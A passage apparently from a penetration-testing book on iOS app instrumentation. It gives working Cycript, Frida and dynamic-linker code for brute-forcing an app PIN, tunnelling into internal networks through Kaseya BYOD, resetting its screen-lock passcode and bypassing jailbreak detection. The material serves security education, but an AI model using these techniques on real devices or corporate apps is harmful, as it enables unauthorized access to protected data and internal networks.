10,000 possible combinations. You can use Cycript to launch such a brute-force attack, as shown here:
cy# var pin=0;
0
cy# function bruteScreenlock()
cy> {
cy> for(var i=1200; i {
cy> var result = [UIApp.delegate checkPassword:""+i];
cy> if(result=="1") pin=i;
cy> }
cy> }
cy# bruteScreenlock()
cy# print:pin;
1234
cy#
For the purposes of the demonstration the loop iterates between 1200–1300 calling the checkPassword method
with a string representation of the current value of the counter. If the return value of checkPassword is equal to
1, then the pin attempted was correct, and the bruteScreenlock function completes, highlighting that the screen
lock PIN was successfully found.
Pivoting to Internal Networks
Many enterprise applications integrate into internal networks, providing users with access to things like internal
file shares, intranet applications, and email. Examples of these types of applications include bring-your-own-
device (BYOD) and mobile device management (MDM) applications, both of which are widely used in corporate
environments. These applications are particularly interesting because if not properly secured they may act as a
pivot to a corporate internal network for any attacker who has compromised the device. To demonstrate this, we
describe an attack against Kaseya BYOD (http://www.kaseya.com/solutions/byod).
Kaseya provides a suite of applications to access documents and email and to facilitate secure web browsing.
Organizations install the Kaseya gateway on their network perimeter to provide access to internal services such
as intranet applications and file shares; these can then be accessed via the Kaseya Secure Browser or Kaseya
Secure Docs applications. You can configure these applications to connect directly to your Kaseya gateway or
routed via the Kaseya relay infrastructure; these act as a proxy to your gateway. An interesting consequence of
this feature is that in the event of an on-device compromise, without any form of authentication, you can exploit
this functionality to tunnel requests to internal networks. The following Cycript function was developed to
demonstrate this:
function doTunneledWebRequest(host)
{
var url = [[NSURL alloc] initWithString:host];
var nsurl = [[NSURLRequest alloc] initWithURL:url];
var rvhttpurl = [[RVHTTPURLProtocol alloc] init];
var helper = [RVHTTPURLProtocolLocalStorageHelper initialize];
[rvhttpurl initWithRequest:nsurl cachedResponse:null client:[rvhttpurl
client]];
rvhttpurl->isa.messages['connectionDidFinishLoading:'] = function() {};
[rvhttpurl startLoading];
[NSThread sleepForTimeInterval:5];
var str = [[NSString alloc] initWithData:rvhttpurl->encryptedResponse
encoding:0x5];
var headerlen = [str rangeOfString:"\n\n"].location;
var b64header = [str substringToIndex:headerlen];
var encryptedheaders = [NSData rlDataFromBase64String:b64header];
var rvcrypt = [[RVCryptor alloc] init];
[rvcrypt usePasswordData:rvhttpurl->answerKey error:""];
var headers = [[NSString alloc] initWithData:[rvcrypt
decryptData:encryptedheaders error:""] encoding:0x5];
var encryptedbody = [str substringFromIndex:b64header.length+2];
var body = [[NSString alloc] initWithData:[rvcrypt
decryptData:[encryptedbody dataUsingEncoding:0x5] error:""] encoding:0x5];
var response = [[NSString alloc] initWithFormat:"%@%@%@", headers, "\n",
body];
return response;
}
Although this may look relatively complex, the function does little more than set up the necessary objects in the
Kaseya Browser application, which are then used to make an encrypted request to the Kaseya proxy. Upon
receiving the encrypted response, the Cycript code then decrypts it. Figure 3.20 shows the result of running the
function with Cycript injected while the application is locked.
Instrumentation Using Frida
Frida (http://www.frida.re/) is a powerful cross-platform framework for instrumenting applications on
Windows, OS X, Linux, and iOS. Unlike most of the instrumentation tools on iOS, Frida does not use Substrate
under the hood; instead, it is a fully standalone framework that requires no modifications to the device other
than running the frida-server binary. Frida has a client-server architecture, and after frida-server is running
on the device it can be controlled over USB (or with some modifications, over the network) by a Frida client
running on your workstation. Frida clients communicate over a bidirectional channel using the Frida Python
API; however, the actual debugging logic happens using JavaScript.
To install Frida on your device, simply install the com.tillitech.frida-server package from the
http://ospy.org Cydia repository. To install Frida on the client side you can install using easy_install:
sudo easy_install frida
After Frida is installed on both the device and your workstation, and the device is plugged in via USB, you can
test whether your Frida setup is working using the following command, which should return a list of processes
running on the iOS device:
redpill:~ dmc$ frida-ps -U
PID NAME
383 Calendar
220 Mail
210 AGXCompilerServi
39 AppleIDAuthAgent
24 BTServer
150 BlueTool
355 CloudKeychainPro
25 CommCenter
11588 DTMobileIS
202 DuetLST
Before you start using Frida to instrument applications, you should familiarize yourself with the JavaScript API
(http://www.frida.re/docs/javascript-api/).
A useful feature of Frida is the frida-trace utility that you can use to trace function calls in your application.
This can be useful in a number of circumstances, such as for monitoring API calls used for encryption and
decryption, or for inspecting the network connections that an application makes. For details on how to trace
applications using Frida, consult the demonstration in Frida’s iOS documentation
(http://www.frida.re/docs/ios/).
However, the reason you may want to use Frida in place of the Substrate-based tools is due to the excellent
Python bindings the tool offers. The example here can help get you up and running with Frida.
With the device connected to your workstation via USB, first load Python and import the Frida module:
redpill:~ dmc$ python
Python 2.7.5 (default, Mar 9 2014, 22:15:05)
[GCC 4.2.1 Compatible Apple LLVM 5.0 (clang-500.0.68)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import frida
>>>
To see whether your client is able to talk to the Frida server, use the enumerate_ devices()method to list the
currently connected devices:
>>> frida.get_device_manager().enumerate_devices()
[Device(id=1, name="Local System", type='local'), Device(id=2,
name="Local TCP", type='remote'), Device(id=3, name="iPad 4",
type='tether')]
>>>
To attach to a process on the device, use the attach()method, providing either a process ID or process name:
>>> process =
frida.get_device_manager().enumerate_devices()[2].attach(1161)
>>>
To see the currently loaded modules in your application, use the enumerate_ modules()method; and to see the
names of the currently loaded modules, iterate through this list:
>>> for module in process.enumerate_modules():
... print module.name
...
BookExamples
MobileSubstrate.dylib
CoreGraphics
UIKit
Foundation
libobjc.A.dylib
libSystem.B.dylib
CoreFoundation
Security
libswiftCore.dylib
libswiftDarwin.dylib
libswiftDispatch.dylib
libswiftFoundation.dylib
libswiftObjectiveC.dylib
To start instrumenting the runtime in an application, you’ll need to use the JavaScript API. To load and execute
a script in your application’s runtime do the following:
>>> def on_message(message, data):
... print(message)
...
>>> jscode = """
... send("hello world")
... """
>>> session = process.session
>>> script = session.create_script(jscode)
>>> script.on('message', on_message)
>>> script.load()
>>> {u'type': u'send', u'payload': u'hello world'}
>>>
This simple example first registers a callback function named on_message(). The callback is used to pass objects
from JavaScript and your application back to the Python bindings, via the send() JavaScript function. Next a
script is created and executed in the process’s session, which executes the JavaScript contained in the jscode
variable. In this example, the JavaScript code simply passes the “hello world” string back to the application.
To start instrumenting the application’s runtime you must write some JavaScript code. As previously noted, you
should familiarize yourself with the JavaScript API before delving in to Frida development, but to get you
started we provide some examples here.
To access an Objective-C object from JavaScript use the ObjC.use() method:
var NSString = ObjC.use("NSString ");
To allocate a new instance of NSString, use the standard Objective-C method, alloc():
var NSString = ObjC.use("NSString").alloc();
To call a method on the newly created object, invoke it just as you would a method on a JavaScript object,
ensuring you replace the “:” with “_” in the naming scheme:
var test = ObjC.use("NSString").alloc().initWithString_("test");
To find a list of all the currently available classes in the application you can use the ObjC.classes variable,
which when passed to the Python instance running on your workstation via a callback will result in output
similar to the following:
>>> {u'type': u'send', u'payload': [u'MFDeliveryResult',
u'AVCaptureAudioChannel', u'UIPopoverButton', u'CDVWhitelist',
u'OS_xpc_shmem', u'AASetupAssistantSetupDelegatesResponse',
u'MPMediaCompoundPredicate', u'NSCache', u'ML3PersistentIDGenerator',
u'GEOTileEditionUpdate', u'UIPrintStatusJobTableViewCell',
u'SAMPSetQueue',
u'ABSectionListVibrantHeaderView', u'WebSecurityOrigin',
u'_UIMotionAnalyzerHistory', u'PFUbiquityFileCoordinator',
u'AAUpgradeiOSTermsResponse', u'NSGlyphNameGlyphInfo',...
These simple illustrations should be sufficient to help you start writing your own Frida scripts to instrument
real apps. Let’s look at an example that demonstrates how you can use Frida to break a real-world applications.
Earlier in this chapter you saw an example of how you could exploit the Kaseya Browser application to pivot to
an internal network. In this example you will see how the Kaseya Browser application can be easily
instrumented using Frida so that the screen lock is bypassed.
When the application is launched, physical access to the application’s internal functionality is protected using a
screen lock, similar to that in Figure 3.20.
Analysis of the application’s class information reveals the following method:
@interface RVSuiteStorage : _ABAddressBookAddRecord
{
}
+ (void)setPasscode:(id)fp8;
As implied by the method name, invoking it sets the passcode for the screen lock, causing any previous
passcodes to be overwritten. To invoke this method using Frida, you can use the following Python script:
import frida,sys
jscode = """
var RVSuiteStorage = ObjC.use("RVSuiteStorage");
RVSuiteStorage.setPasscode_("9876");
"""
process = frida.get_device_manager().enumerate_devices()[2].attach(1179)
session = process.session
script = session.create_script(jscode)
script.load()
Running this Frida script resets the application’s screen lock passcode to 9876. If you have physical access, you
can now log in to the application using this code!
Instrumenting the Runtime Using the Dynamic Linker
So far we’ve covered how to instrument the runtime using Substrate and Frida. However, you can use another
relatively simple technique to instrument methods in a target iOS app. Linux users may be aware of the
LD_PRELOAD environment variable that can be used to dynamically load a library into a process, whereas Mac OS
X has a similar equivalent environment variable named DYLD_INSERT_LIBRARIES. iOS also allows runtime
method replacement using the same technique.
To demonstrate this, consider the earlier example of the [SecurityController isJailBroken] jailbreak
detection function that returned a Boolean, a yes or no on whether the device is jailbroken. The objective of the
attack is to replace the method implementation so that it always returns no so that the device is never
recognized as jailbroken.
Following is a simple implementation of a dynamic library that uses method swizzling to replace a method’s
implementation:
#include 
#include 
#import 
#include 
BOOL (*old_isJailBroken)(id self, SEL _cmd);
BOOL new_isJailBroken(id self, SEL _cmd)
{
NSLog(@"Hooked isJailbroken");
return NO;
}
static void __attribute__((constructor)) initialize(void)
{
NLog(@"Installing hook");
class_replaceMethod(objc_getClass("SecurityController"), \
@selector(isJailBroken), (IMP) new_isJailBroken, (IMP*)old_isJailBroken);
}
This example is similar to the Substrate example earlier, except that it does not use the Substrate APIs. The
library injects a new constructor into the application and uses the class_replaceMethod() function to swizzle
the implementation of the isJailbroken selector.
To compile the example as a dynamic library using clang, you use the following command:
clang -arch armv7 -isysroot
/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Deve
loper/SDKs/iPhoneOS8.0.sdk -dynamiclib -framework Foundation -lobjc
isjailbroken.m -o isjailbroken.dylib
After your library is compiled, upload it to the device via scp and place it in the /usr/lib directory. To force an
application to respect the DYLD_INSERT_LIBRARIES environment variable you can use launchctl:
launchctl setenv DYLD_INSERT_LIBRARIES "/usr/lib/isjailbroken.dylib"
The application can now be launched as normal through the user interface and the SecurityController
isJailBroken method will always return NO, because the function implementation has been replaced with one
that simply returns NO in all cases.
Inspecting iOS Applications using Snoop-it
Tools are an essential part of any security professional’s arsenal and anything that introduces automation of
otherwise cumbersome tasks should always be welcomed. Perhaps one of the most complete toolkits for
penetration testing iOS applications is Snoop-it, which under the hood uses Substrate to instrument an
application. Snoop-it (https://code.google.com/p/snoop-it/) is best described by the tool’s author Andreas
Kurtz:
“Snoop-it is a tool to assist dynamic analysis and blackbox security assessments of mobile apps by retrofitting
existing apps with debugging and runtime tracing capabilities. Snoop-it allows on-the-fly manipulations of
arbitrary iOS apps with an easy-to-use graphical user interface. Thus, bypassing client-side restrictions or
unlocking additional features and premium content of Apps is going to be child’s play.”
Snoop-it contains several features you can use during an iOS application security assessment, including but not
limited to the following useful activities:
Monitoring filesystem, network, keychain, and sensitive API access
Detecting basic jailbreak bypasses
Inspecting the Objective-C runtime state, including loaded classes and available methods
Monitoring of the console log
Tracing methods
To install Snoop-it simply install the de.nesolabs.snoopit package from the http://repo.nesolabs.de/ Cydia
repository. After the Snoop-it package is installed you can launch the Snoop-it application that should now be
visible on your device’s user interface. Figure 3.21 shows the application configuration view where you are able
to select the applications that you want to be inspected.
Selecting an application and then subsequently opening the target application causes Snoop-it to load a
webserver within the runtime of your target application. You can reach the Snoop-it web server by browsing to
the external interface of your device on TCP port 12345, using username and password credentials of snoop-it
and snoop-it. After you’re logged in to the Snoop-it web server, a view similar to the one shown in Figure 3.22
appears.